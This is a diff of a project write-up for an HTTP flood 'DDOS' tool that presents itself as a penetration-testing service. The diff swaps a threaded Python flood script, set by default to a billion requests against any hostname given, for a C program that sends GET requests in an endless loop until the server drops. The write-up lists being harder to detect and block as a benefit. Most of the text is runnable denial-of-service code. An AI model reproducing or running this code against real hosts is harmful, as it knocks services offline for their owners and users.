@@ -25,7 +25,7 @@ output:
 
 ![](https://www.xenonstack.com/images/insights/xenonstack-what-is-penetration-testing.png)
 
-We aim to creat an efficient and distributed DDOS that will allow for companies and clients to test how secure their systems are in the case of a **real** DDOS attack.
+We aim to create an efficient and distributed DDOS that will allow for companies and clients to test how secure their systems are in the case of a **real** DDOS attack.
 
 ## Possible use case clients include:
 
@@ -52,7 +52,7 @@ Benefits:
 - Less bandwidth than alternatives
 - Harder to detect and block
 
-Attack Type: POST
+Attack Type: GET
 Targets OSI layer #7
 
 ### Weaknesses
@@ -67,66 +67,103 @@ $$\downarrow Scroll \downarrow$$
 
 \break
 
-```python
-import socket
-import threading
-import random
-import string
-import sys
-import time
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+//#include <mpi.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netdb.h>
+#include <arpa/inet.h>
 
-hostName = ""
-ipAddr = ""
-portNum = 0
-packets = 0
+const char *getIp(const char *hostname, char *restrict ip)
+{
+	struct in_addr **addr_list;
+	struct hostent *host;
+	int i;
 
-#parsing inputs from command line
-#host name must be entered as url with nothing proceding the domain name
-#ex: google.com, reddit.com
-if len(sys.argv)==2:
-    hostName = str(sys.argv[1])
-    portNum = 80#default port for HTTP
-    packets = 1000000000#default number of requests sent to ip address
-else:
-    sys.exit(1)#no valid input
+	if ((host = gethostbyname(hostname)) == NULL) //return information about host
+	{
+		herror("gethostbyname");
+		exit(0);
+	}
 
-#convert the host name to an IPv4 address
-#if the host name is already an IPv4 address nothing is changed
-ipAddr = socket.gethostbyname(hostName)
-byteHostName = ipAddr.encode('utf-8','ignore')#convert string > bytes
+	addr_list = (struct in_addr **)host->h_addr_list; //create address list from host info
 
-#generates fake url path
-def fake_url():
-    charPool = str(string.ascii_letters + string.digits + string.punctuation)
-    url = "".join(random.sample(charPool,10))
-    url = url.encode('utf-8','ignore')#convert string>bytes
-    return url
+	for (i = 0; addr_list[i] != NULL; i++)
+	{
+		strcpy(ip, inet_ntoa(*addr_list[i])); //choose ip from address list
+	}
 
+	printf("IP address: %s\n", ip);
 
-def ddos():
-    byte_url = fake_url()
+	return ip;
+}
 
-    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #https://docs.python.org/3/library/socket.html 
+int httpFlood(const char *ip, int port)
+{
 
-    try:
-        connection.connect((ipAddr,portNum))#establish connection using IPv4 address and port number, port maybe the default port 80
-        connection.send(b'Get /%b HTTP/1.1\nHost: %b\n\n' % (byte_url,byteHostName))#socket.send can only accept bytes
-    except socket.error:#happens if a site goes down or ip is banned
-        print ("\n Unable to establish connection, site may be down or your ip has been banned.")
-      
-    finally:
-        connection.shutdown(socket.SHUT_RDWR)
-        connection.close()
+	int socket_desc;
+	struct sockaddr_in server;
+	char *message;
 
-threads = []
-for i in range(packets):
-    thread1 = threading.Thread(target=ddos)
-    thread1.start()
-    threads.append(thread1)
-    time.sleep(0.01)
+	socket_desc = socket(AF_INET, SOCK_STREAM, 0); //create socket
+	if (socket_desc == -1)						   //above function returns -1 on socket error
+	{
+		printf("Could not create socket\n");
+	}
 
-for current_thread in threads:
-    current_thread.join()
+	server.sin_addr.s_addr = inet_addr(ip); //setting ip address in struct
+	server.sin_family = AF_INET;			//setting connection type in struct
+	server.sin_port = htons(port);			//setting port number in struct
+
+	if (connect(socket_desc, (struct sockaddr *)&server, sizeof(server)) < 0) //connect to ip address
+	{
+		printf("Could not connect\n");
+		return 1;
+	}
+
+	printf("Connected\n");
+
+	message = "GET / HTTP/1.1\r\n\r\n"; //HTTP GET message to get home page
+
+	int true = 0;
+	printf("Flooding\n");
+
+	while (true == 0) //	infinite flood loop
+	{
+		if (send(socket_desc, message, strlen(message), 0) < 0) //break loop once connection is broken, aka. sever down
+		{
+			printf("Server down\n");
+			return 1;
+		}
+	}
+}
+
+int main(int argc, char *argv[])
+{
+	char hostname[256];
+	char ip[100];
+	int port;
+
+	if (argc == 2)
+	{
+		strcpy(hostname, argv[1]); //host name from command line
+		port = 80;				   //atoi(argv[2]);  //port number can be retrieved from command line, for now it is default port 80
+	}
+	else
+	{
+		printf("Usage: ./filename {hostName}\n"); //incorrect number of arguments print out
+		exit(0);
+	}
+
+	getIp(hostname, ip); //get ip address from host name
+
+	httpFlood(ip, port); //flood ip address with HTTP GET requests
+
+	return 0;
+}
 ```
 
 ![](https://media.giphy.com/media/RyXVu4ZW454IM/giphy.gif)
